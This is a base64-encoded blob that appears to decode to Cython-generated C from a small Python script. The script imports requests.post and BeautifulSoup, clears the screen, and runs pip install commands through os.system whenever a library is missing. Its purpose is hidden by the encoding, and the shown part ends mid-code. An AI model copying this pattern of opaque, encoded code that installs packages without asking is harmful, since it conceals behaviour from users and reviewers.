SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcnIsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCA1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX3B5eF90XzMgPSBfX1B5eF9QeUxpc3RfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hvaWNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSwgX19weXhfdF8zLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jaG9pY2UpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2MsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX3B5eF90XzIgPSBfX1B5eF9QeUxpc3RfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcG9zdCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cywgX19weXhfdF8yLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wb3N0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3BwLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgNywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXMsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgOCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgOSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgOSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX3B5eF90XzIgPSBOVUxMO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgX19weXhfdF82ID0gMTtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGVhcn07XG4gICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfNywgJl9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nmb250cywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDEyLCBfX3B5eF9MMl9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jZm9udHMsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAxMiwgX19weXhfTDJfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzMgPSBfX1B5eF9QeUxpc3RfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVuZGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTMsIF9fcHl4X0wyX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nmb250cywgX19weXhfdF8zLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTMsIF9fcHl4X0wyX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVuZGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTMsIF9fcHl4X0wyX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlbmRlciwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzLCBfX3B5eF9MMl9lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICBnb3RvIF9fcHl4X0w3X3RyeV9lbmQ7XG4gICAgX19weXhfTDJfZXJyb3I6O1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcblxuICAgIFxuICAgICB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImpxIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzUsICZfX3B5eF90XzMsICZfX3B5eF90XzIpIDwgMCkgX19QWVhfRVJSKDAsIDE0LCBfX3B5eF9MNF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF85ID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDE1LCBfX3B5eF9MNF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDE1LCBfX3B5eF9MNF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgX19weXhfdF82ID0gMTtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9waXBfaW5zdGFsbF9weXRob25fY2ZvbnRzfTtcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxNSwgX19weXhfTDRfZXhjZXB0X2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgZ290byBfX3B5eF9MM19leGNlcHRpb25faGFuZGxlZDtcbiAgICB9XG5cbiAgICBcbiAgICBfX3B5eF9MNF9leGNlcHRfZXJyb3I6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF83LCBfX3B5eF90XzgpO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDNfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF83LCBfX3B5eF90XzgpO1xuICAgIF9fcHl4X0w3X3RyeV9lbmQ6O1xuICB9XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfOCwgJl9fcHl4X3RfNywgJl9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlcXVlc3RzLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTcsIF9fcHl4X0wxMF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cywgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE3LCBfX3B5eF9MMTBfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICAgICAgXG4gICAgfVxuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIGdvdG8gX19weXhfTDE1X3RyeV9lbmQ7XG4gICAgX19weXhfTDEwX2Vycm9yOjtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuXG4gICAgXG4gICAgIHtcbiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygianEiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMiwgJl9fcHl4X3RfMywgJl9fcHl4X3RfNSkgPCAwKSBfX1BZWF9FUlIoMCwgMTgsIF9fcHl4X0wxMl9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMSA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMTksIF9fcHl4X0wxMl9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTtcbiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxOSwgX19weXhfTDEyX2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgX19weXhfdF82ID0gMTtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfcmVxdWVzdHN9O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTksIF9fcHl4X0wxMl9leGNlcHRfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgfVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBnb3RvIF9fcHl4X0wxMV9leGNlcHRpb25faGFuZGxlZDtcbiAgICB9XG5cbiAgICBcbiAgICBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzgsIF9fcHl4X3RfNywgX19weXhfdF8xKTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0wxMV9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfMSk7XG4gICAgX19weXhfTDE1X3RyeV9lbmQ6O1xuICB9XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfNywgJl9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeUxpc3RfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQmVhdXRpZnVsU291cCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMThfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYnM0LCBfX3B5eF90XzUsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyMSwgX19weXhfTDE4X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQmVhdXRpZnVsU291cCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMThfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQmVhdXRpZnVsU291cCwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMThfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gICAgICBcbiAgICB9XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgZ290byBfX3B5eF9MMjNfdHJ5X2VuZDtcbiAgICBfX3B5eF9MMThfZXJyb3I6O1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG5cbiAgICBcbiAgICAge1xuICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJqcSIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8zLCAmX19weXhfdF81LCAmX19weXhfdF8yKSA8IDApIF9fUFlYX0VSUigwLCAyMiwgX19weXhfTDIwX2V4Y2Vw